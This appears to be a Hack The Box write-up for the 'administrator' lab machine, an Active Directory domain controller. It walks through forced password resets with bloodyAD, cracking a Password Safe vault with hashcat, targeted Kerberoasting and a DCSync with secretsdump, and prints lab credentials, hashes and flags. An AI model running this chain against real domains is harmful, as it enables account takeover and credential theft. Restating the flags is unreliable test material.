---
layout: post
title: HTB - administrator
date: 2025-04-23 10:00 -0400
---

{{ 'administrator' | get_machine_avatar | raw }}

# nmap
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-23 09:13 -04
Nmap scan report for 10.10.11.42
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-23 20:13:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
60893/tcp open  msrpc         Microsoft Windows RPC
60896/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60907/tcp open  msrpc         Microsoft Windows RPC
60912/tcp open  msrpc         Microsoft Windows RPC
60915/tcp open  msrpc         Microsoft Windows RPC
60934/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2025-04-23T20:14:40
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.76 seconds
```

# user
We start with some creds:
- Username: Olivia
- Password: ichliebedich

Ftp open is interesting.

There is a ADMIN$ share that looks interesting but we can't read that.
```bash
» netexec smb $(cat ip.txt) -u Olivia -p 'ichliebedich' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

Let's look at writable ldap attrs for Olivia
```bash
» bloodyAD -u Olivia -p ichliebedich --host administrator.htb get writable --detail
```

Looks like it has a lot of writes on `Michael Williams`. Let's take a better look with bloodhound.

We can use `olivia` to get to `michael` and `michael` to get to `benjamin`.
![esc chain](/assets/img/administrator1.png)

```bash
» bloodyAD -k --host dc.administrator.htb -d administrator.htb set password Michael 'asdf1234$Ba'
» bloodyAD -u Michael -p 'asdf1234$Ba' --host administrator.htb set password Benjamin 'asdf1234$Ba
```

Michael has winrm but there isn't much in there.

Ftp accepts benjamin creds and there is a Backup.safe3 in there.

We can crack it with `hashcat ./Backup.psafe3 ~/wordlists/rockyou.txt -m 5200 -a 0`
- ./Backup.psafe3:tekieromucho

Then we use pwsafe to access it.
![vault1](/assets/img/administrator7.png)
![vault2](/assets/img/administrator6.png)

- emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
- emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
- alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw

emily is the only of the three with winrm access so lets focus on that.
```bash
*Evil-WinRM* PS C:\Users\emily\Documents> type ..\Desktop\user.txt
cd368971f88837d54608046d3a0eddee
```

# root
From here emily can change ethan password and ethan can use DCSync to get domain controller.
![emily to ethan](/assets/img/administrator3.png)

Could not change ethan password and could not figure out why so we going with targetedKerberoast:

```bash
targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
# $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*...
```

- ethan:limpbizkit

Now just DCSync.

```bash
secretsdump.py administrator.htb/ethan:limpbizkit@dc.administrator.htb -just-dc-user Administrator
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
ccf442a948304068163d5f8b2f8898aa
```
